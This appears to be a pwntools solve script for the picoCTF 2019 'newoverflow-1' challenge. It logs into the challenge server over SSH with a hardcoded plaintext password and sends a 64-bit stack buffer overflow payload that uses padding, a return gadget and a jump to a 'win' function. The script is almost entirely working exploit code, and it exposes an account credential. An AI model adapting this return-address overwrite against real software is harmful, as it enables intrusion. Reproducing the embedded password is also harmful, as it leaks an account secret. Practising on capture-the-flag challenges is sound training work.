from pwn import *
#ssh
sh = ssh(user="ChrisBlows",host="2019shell1.picoctf.com",port=22,password="7469260408g")
sh.set_working_directory("/problems/newoverflow-1_0_f9bdea7a6553786707a6d560decc5d50")

#for 64 bit you must add a return gadget to your shellcode before the "win"
#function call, to ensure proper stack alignment
sc = cyclic(72) + p64(0x00000000004007e7) + p64(0x0000000000400767)
f = open("sc","wb")
f.write(sc)
f.close()
io = sh.process("./vuln")
#gdb.attach(io,"b main\n r < sc")
io.sendline(sc)
io.interactive()
